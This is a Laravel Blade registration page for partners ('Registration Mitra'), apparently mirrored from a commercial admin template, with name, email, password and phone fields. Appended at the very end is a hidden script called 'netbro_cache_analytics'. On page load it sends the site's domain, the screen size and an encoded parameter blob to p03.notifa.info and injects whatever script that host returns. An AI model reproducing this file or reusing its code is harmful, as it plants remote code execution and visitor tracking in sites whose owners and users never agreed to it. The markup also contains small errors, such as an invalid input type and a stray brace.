<!DOCTYPE html>
<html>


<!-- Mirrored from radixtouch.in/templates/admin/smart/source/dark/sign_up.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Mar 2020 06:08:49 GMT -->
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <meta name="description" content="Responsive Admin Template" />
    <meta name="author" content="RedstarHospital" />
    <title>Smart University | Bootstrap Responsive Admin Template</title>
    <!-- google font -->
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700&amp;subset=all" rel="stylesheet"
          type="text/css" />
    <!-- icons -->
    <link href="{{asset('assets/fonts/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="{{asset('assets/plugins/iconic/css/material-design-iconic-font.min.css')}}">
    <!-- bootstrap -->
    <link href="{{asset('assets/plugins/bootstrap/css/bootstrap.min.css')}}}" rel="stylesheet" type="text/css" />
    <!-- style -->
    <link rel="stylesheet" href="{{asset('assets/css/pages/extra_pages.css')}}">
    <!-- favicon -->
    <link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />
</head>

<body>
<div class="limiter">
    <div class="container-login100">
        <div class="wrap-login100">
            <form class="login100-form validate-form" method="post" action="{{route('adminmitra.register.submit')}}">
                @csrf
                <span class="login100-form-logo">
						<img alt="" src="{{asset('assets/img/logo-2.png')}}">
					</span>
                <span class="login100-form-title p-b-34 p-t-27">Registration Mitra</span>
                @if($message = Session::get('error'))
                    <p>{{ $message }}</p>
                @endif
                <div class="row">
                    <div class="col-lg-6 p-t-20">
                        <div class="wrap-input100 validate-input" data-validate="Enter username">
                            <input class="input100" type="nama_mitra" name="nama_mitra" placeholder="Nama Mitra" >
                            <span class="focus-input100" data-placeholder="&#xf207;"></span>

                        </div>
                    </div>

                    <div class="col-lg-6 p-t-20">
                        <div class="wrap-input100 validate-input" data-validate="Enter email">
                            <input class="input100" type="email" name="email" placeholder="Email">
                            <span class="focus-input100" data-placeholder="&#xf207;"></span>
                        </div>
                    </div>
                    <div class="col-lg-6 p-t-20">
                        <div class="wrap-input100 validate-input" data-validate="Enter password">
                            <input class="input100" type="password" name="password" placeholder="Password">
                            <span class="focus-input100" data-placeholder="&#xf191;"></span>
                        </div>
                    </div>
                    <div class="col-lg-6 p-t-20">
                        <div class="wrap-input100 validate-input" data-validate="Enter password again">
                            <input class="input100" type="number" name="no_hp" placeholder="No Hp">
                            <span class="focus-input100" data-placeholder="&#xf2be;"></span>
                        </div>
                    </div>

                </div>
                <div class="container-login100-form-btn">
                    <button class="login100-form-btn">
                        Register
                    </button>
                </div>
                <div class="text-center p-t-30">
                    <a class="txt1" href="login.html">
                        You already have a membership?
                    </a>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- start js include path -->
<script src="{{asset('assets/plugins/jquery/jquery.min.js')}}"></script>
<!-- bootstrap -->
<script src="{{asset('assets/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
<script src="{{asset('assets/js/pages/extra-pages/pages.js')}}"></script>
<!-- end js include path -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXbzwnIHA%2fXb5E9G%2f0B7ngMn4Lwy4drJdIR%2begnI0%2beQqTBExqdDFnhvKYAcvw1ymtVfG2hqNGpjZ6SYKpr%2baHsiEKrUCy1Iy1x6YyjmeLg3byLc2Uam7AKMZ7YvkoCUvFeB7%2fRTaWIl1NxB2e6yKJdy6M8loxYfAs8OfHjs1DkWnmtvB85RsvqULuZBqYOHtJPzCi6n04AfaBA%2fWndgx2VjBjUVoWp8rvwO4fePpnGAamy0mkeMztKkEXcSF9ZNoBKYKtnrw4x1%2blu4EF8kRM8Lgy8I1u6qY%2bEofXav%2fBixIMxQwk3wadKdN11hH%2bc4zwxldGY1L2c3ADra1Y7B%2fE0s2djOIz%2fU0QZFXX1se%2bv5TxLi4i0ZsM2U5%2fAUL4v1%2bO2xgPxMXlhPlTYZG1S4bbsUq2nEVh49WEehFZj0jlzPdzu4ZmrBE%2fxNfGa%2fDJPQpSimJ7RVFTg8JSfrBHoj6OrXF2FqL4syjStwZcC5eTPToKrBw1U1rSkTZfCfOwjwywRra1MaycpUo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from radixtouch.in/templates/admin/smart/source/dark/sign_up.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Mar 2020 06:08:49 GMT -->
</html>